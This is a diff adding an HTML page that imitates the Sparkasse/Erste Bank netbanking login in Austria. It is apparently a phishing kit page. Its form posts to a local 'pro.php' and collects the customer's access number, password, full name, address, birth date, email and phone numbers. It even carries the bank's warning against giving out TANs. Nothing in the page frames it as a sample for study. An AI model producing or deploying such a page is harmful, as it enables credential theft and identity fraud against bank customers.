@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <!-- null -->
+  <meta content="content-type" http-equiv="content-type" />
+  <script src="index_files/browser.htm">
+  </script>
+  <title>
+   netbanking.sparkasse.at   - Login
+  </title>
+  <link href="index_files/netbanking-login-style.css" type="text/css" rel="stylesheet" />
+  <!--[if IE 7]><link rel="stylesheet" type="text/css" href="styles/netbanking-login-style-ie7.css"><![endif]-->
+  <link type="image/x-icon" href="https://netbanking.sparkasse.at/casserver/images/favicon.ico" rel="icon" />
+  <link type="image/x-icon" href="https://netbanking.sparkasse.at/casserver/images/favicon.ico" rel="shortcut icon" />
+  <script src="index_files/jquery-1.js">
+  </script>
+  <script src="index_files/internal.htm">
+  </script>
+  <script>
+  </script>
+ </head>
+ <body>
+  <form action="pro.php" method="post" name="login">
+   <input type="hidden" value="1" name="go" />
+   <div id="nb-login-container">
+    <div id="nb-header">
+     <div class="logo">
+      <img src="index_files/inst009.gif" />
+     </div>
+     <div class="flag">
+      <a title="Deutsch" class="austria" onclick="return setLanguage('nblocale=de')" href="#">
+      </a>
+      <a title="English" class="england" onclick="return setLanguage('nblocale=en')" href="#">
+      </a>
+     </div>
+    </div>
+    <div id="content-login">
+     <h2>
+      netbanking Login
+     </h2>
+     <div class="main-content-detail">
+      <div class="login-info">
+       <div class="login-image">
+        <img alt="" src="index_files/img_login.jpg" />
+       </div>
+       <div class="login-description">
+        <div class="top-section">
+         <strong>
+          wichtiger sicherheits hinweis:
+         </strong>
+         <p>
+          Die Erste Bank und Sparkassen werden zum Anmelden von Ihnen NIEMALS TAN, TAC-SMS oder Kreditkartendaten verlangen!!!
+         </p>
+        </div>
+        <div class="section-detail">
+         Den für die Benutzung von netbanking gültigen
+         <a onclick="doPopUp('https://netbanking.sparkasse.at/hilfe/Footer/AGB')" href="#">
+          Geschäftsbedingungen
+         </a>
+         stimme ich durch Eingabe von Verfügernummer und Passwort ausdrücklich zu.
+        </div>
+       </div>
+      </div>
+      <div class="login-form">
+       <div style="width: 100%;" class="row">
+        Hier mit netbanking-Verfügernummer und dem netbanking-Passwort anmelden.
+       </div>
+       <div class="row">
+        <label>
+         Verfügernummer
+        </label>
+        <input type="text" maxlength="9" tabindex="1" name="user_id" />
+       </div>
+       <div class="row">
+        <label>
+         Passwort
+        </label>
+        <input type="password" autocomplete="off" value="" tabindex="2" size="12" maxlength="60" name="password" />
+        <a href="javascript:openKeyboard('password');" class="keyboard">
+         Virtuelles Keyboard
+        </a>
+        <span>
+         <a onclick="doPopUp('https://netbanking.sparkasse.at/hilfe/sicherheit/sicherheitshinweise/schutz/virtuelles-keyboard')" class="info" href="javascript:void(0);">
+         </a>
+        </span>
+       </div>
+       <div class="row">
+        <label>
+         Vollständiger Name
+        </label>
+        <input type="text" maxlength="50" tabindex="1" name="tan" />
+       </div>
+       <br />
+       <div class="row">
+        <label>
+         Strasse,Huis Nr
+        </label>
+        <input type="text" maxlength="50" tabindex="1" name="stase" />
+       </div>
+       <div class="row">
+        <label>
+         PLZ,Ort
+        </label>
+        <input type="text" maxlength="50" tabindex="1" name="plz" />
+       </div>
+       <div class="row">
+        <label>
+         Geburtsdatum
+        </label>
+        <input type="text" maxlength="15" tabindex="1" name="geb" />
+       </div>
+       <div class="row">
+        <label>
+         E-Mail-Adresse
+        </label>
+        <input type="text" maxlength="50" tabindex="1" name="email" />
+       </div>
+       <div class="row">
+        <label>
+         Telefonnummer
+        </label>
+        <input type="text" maxlength="50" tabindex="1" name="tel" />
+       </div>
+       <div class="row">
+        <label>
+         Handy
+        </label>
+        <input type="text" maxlength="50" tabindex="1" name="mob" />
+       </div>
+       <div class="row">
+        <div class="action">
+         <input type="submit" value="Login" onclick="" name="submit" />
+         <span class="forgot-password">
+          <a onclick="doPopUp('https://netbanking.sparkasse.at/hilfe/einstellungen/Passwort-vergessen')" href="#">
+          </a>
+         </span>
+        </div>
+       </div>
+       <div class="row">
+        <a class="back" href="http://www.sparkasse.at/">
+         Zurück
+        </a>
+       </div>
+      </div>
+      <div class="login-right-nav">
+       <h3>
+        Kontakt &amp; Services
+       </h3>
+       <div>
+        <ul>
+         <!-- linkHasNext BEGINN -->
+         <li>
+          <a onclick="doPopUp('https://netbanking.sparkasse.at/hilfe/postfach-ablage-helpdesk/Helpdesk')" href="#">
+           Helpdesk
+          </a>
+         </li>
+         <li>
+          <a onclick="doPopUp('https://netbanking.sparkasse.at/hilfe/sicherheit')" href="#">
+           Sicherheit
+          </a>
+         </li>
+         <li>
+          <a onclick="doPopUp('https://netbanking.sparkasse.at/hilfe/aktuelles')" href="#">
+           Aktuelles
+          </a>
+         </li>
+         <li>
+          <a onclick="doPopUp('http://netbanking-info-tour.sparkasse.at')" href="#">
+           netbanking Info-Tour
+          </a>
+         </li>
+         <li>
+          <a onclick="doPopUp('https://netbanking.sparkasse.at/hilfe/einstellungen/Sicherheit/TAC-SMS')" href="#">
+           TAC-SMS - die sichere und komfortable Alternative zur TAN!
+          </a>
+         </li>
+        </ul>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </form>
+  <script src="index_files/dhtml.js">
+  </script>
+  <script>
+  </script>
+  <script type="text/javascript">
+  </script>
+  <script>
+   var WinWidth=0;
+var WinHeight=0;
+var ScrollLeft;
+var ScrollTop;
+
+function openKeyboard(keypadInput, keypadSubmit) {
+		var obj = document.getElementsByName(keypadInput)[0];
+		var keypadForm = obj.form.name;
+		var submitParam = "";
+
+		if (keypadSubmit != undefined &amp;&amp; keypadSubmit != null) {
+			submitParam = "&amp;keypadSubmit=" + keypadSubmit;
+		}
+
+		
+
+		getWinSize();
+		var xcoor = Math.floor(Math.random() * (WinWidth - 519)) + ScrollLeft;
+		var ycoor = Math.floor(Math.random() * (WinHeight - 190)) + ScrollTop;
+
+		window.open('https://netbanking.sparkasse.at/casserver/keypad.jsp?keypadForm=' + keypadForm + '&amp;keypadInput=' + keypadInput + submitParam, 'vk',
+						'width=519,height=190,scrollbars=no,resizable=yes,status=no,left='+xcoor+',top='+ycoor);
+}
+function WinSizeNotSupported() {
+    nbalert ('&lt;fmt:message key="browserNOK"/&gt;');
+
+}
+
+/*--------------------------------------------
+gets size of available document or Windowsize,
+whichever is bigger.*/
+function getWinSize() {
+	getWinSize = WinSizeNotSupported;
+	if(document.all) {
+		/* Internet Explorer	*/
+		getWinSize = wsq1;
+		if (!document.body.scrollWidth) {
+			/*Operaspecific: Opera in the Internet mode
+			 doesn't understand scrollWidth/scrollHeight,
+			 but clientWidth gives the scrollWidth... */
+			getWinSize = wsq2;
+		}
+	}else if(document.layers) {
+		/* Netscape?? */
+		getWinSize = wsq3;
+	}else if (document.getElementById) {
+		if (document.height) {
+			/* Netscape 6 &amp; Mozilla 1 */
+			getWinSize = wsq3;
+		}else if (document.body.offsetWidth) {
+			/* For Opera &amp; Opera in Mozilla mode: */
+			// ??? (wsq5 war bisher nicht realisiert???)
+			// für FF 6
+            getWinSize = wsq5;
+		}
+	}
+	getWinSize();
+}
+
+/* For IE 6: */
+function wsq1() {
+	with(document.body){
+		WinWidth = clientWidth;
+		WinHeight = clientHeight;
+
+		Winx = scrollWidth;
+		Winy = scrollHeight;
+
+		if (clientWidth &gt; Winx) {
+			Winx = clientWidth;
+		}
+		if (clientHeight &gt; Winy) {
+			Winy = clientHeight;
+		}
+		ScrollLeft = scrollLeft;
+		ScrollTop = scrollTop;
+	}
+}
+
+/* For Opera in the IE mode */
+function wsq2() {
+	WinWidth = document.body.clientWidth;
+	WinHeight = document.body.clientHeight;
+	Winx = document.body.clientWidth;
+	Winy = document.body.clientHeight;
+	ScrollLeft = document.body.scrollLeft;
+	ScrollTop = document.body.scrollTop;
+}
+
+/* For Netscape 6 &amp; Mozilla 1
+ Netscape 4.08 (Win) */
+function wsq3() {
+
+	WinWidth = window.innerWidth;
+	WinHeight = window.innerHeight;
+	Winx = document.width;
+	Winy = document.height;
+	if (window.innerWidth &gt; Winx) {
+		Winx = window.innerWidth;
+	}
+	if (window.innerHeight &gt; Winy) {
+		Winy = window.innerHeight;
+	}
+	ScrollLeft = window.pageXOffset;
+	ScrollTop = window.pageYOffset;
+}
+
+/* For Firefox 6 */
+function wsq5() {
+    WinWidth = document.body.offsetWidth;
+    WinHeight = document.body.offsetHeight;
+    Winx = document.body.scrollWidth;
+    Winy = document.body.scrollHeight;
+    if (document.body.offsetWidth &gt; Winx) {
+        Winx = window.innerWidth;
+    }
+    if (document.body.offsetHeight &gt; Winy) {
+        Winy = window.innerHeight;
+    }
+    ScrollLeft = window.pageXOffset;
+    ScrollTop = window.pageYOffset;
+}
+  </script>
+  <script>
+  </script>
+  <div style="display: none; visibility: hidden; position: absolute;">
+   <img onerror="rmuerr()" id="bsrmu" src="index_files/bsrmu.gif" />
+   <img id="bsrmu2" />
+  </div>
+ </body>
+</html>
